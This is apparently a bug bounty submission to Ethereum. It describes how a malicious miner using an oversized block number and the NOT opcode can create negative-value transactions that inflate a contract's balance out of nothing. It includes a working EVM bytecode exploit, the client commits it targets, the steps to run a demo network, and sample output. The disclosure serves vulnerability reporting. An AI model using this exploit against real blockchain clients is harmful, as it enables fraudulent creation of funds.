Ethereum Bug Bounty Submission: Sending Negative Value Transactions
---
A miner can create a valid block with any blocknumber `n` on top of any block. 
Assume `n`  exceeds 32 byte.
A contract mined in that block can push `n` on the stack using the NUMBER opcode. 
Because the NOT opcode assumes that all values on the stack are smaller than 32 byte, 
its result will be negative. Then we can use that number to create a transaction with 
negative value. Because the Transfer method simply subtracts the tx value, the contracts balance will actually increase by `n - 2^256 + 1` units out of thin air.

Contract:
```
PUSH1 0 PUSH1 0 PUSH1 0 PUSH1 0 NUMBER NOT PUSH20 someAddr PUSH1 0 CALL
```

Works out-of-the-box against the develop branch (643eda5), but there is a patch for master (771bfe9) as well. The following starts a private network with a malicious miner and a node, creates the contract at the miner and reads the balance from the node.

```
./install.sh
./run.sh
./demo.py
```

Sample output for block with `n=2^512+i`:
```
Create new contract with zero initial balance. Address: 0b435977a4375bd84162499bc2d02a07c3ecbe80
Press enter when the client received the block

Contract balance: ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000d
Receiver balance: ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000d
```
Contract balance is `2^512 + i - 2^256 + 1`.


